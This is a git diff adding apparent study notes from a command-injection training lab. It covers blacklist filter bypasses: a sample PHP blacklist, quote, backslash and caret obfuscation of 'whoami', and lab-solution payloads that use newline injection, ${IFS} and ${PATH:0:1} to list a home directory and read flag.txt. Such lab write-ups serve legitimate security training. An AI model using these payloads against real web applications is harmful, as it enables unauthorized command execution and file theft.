@@ -122,5 +122,57 @@ ip=127.0.0.1%0als${IFS}-la${IFS}${PWD:0:1}home
 
 ### Commands Blacklist
 
+A basic command blacklist filter in `PHP` would look like the following:
 
+```php
+$blacklist = ['whoami', 'cat', ...SNIP...];
+foreach ($blacklist as $word) {
+    if (strpos('$_POST['ip']', $word) !== false) {
+        echo "Invalid input";
+    }
+}
+```
 
+<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
+
+### Linux & Windows
+
+if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:
+
+```shell-session
+1y4d@htb[/htb]$ w'h'o'am'i
+21y4d
+
+21y4d@htb[/htb]$ w"h"o"am"i
+21y4d
+
+who$@ami
+w\ho\am\i
+```
+
+The important things to remember are that `we cannot mix types of quotes` and `the number of quotes must be even`. We can try one of the above in our payload (`127.0.0.1%0aw'h'o'am'i`) and see if it works:
+
+<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+
+### Windows Only
+
+```cmd-session
+C:\htb> who^ami
+21y4d
+```
+
+### PoCs - Questions
+
+Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.
+
+Use the begains techniques, we can found the flag.txt into the 1nj3c70r directory:
+
+```
+127.0.0.1%0als${IFS}-la${IFS}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home${PATH:0:1}1nj3c70r
+```
+
+Now, we need only read it -->
+
+```
+ip=127.0.0.1%0a'c''a''t'${IFS}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+```
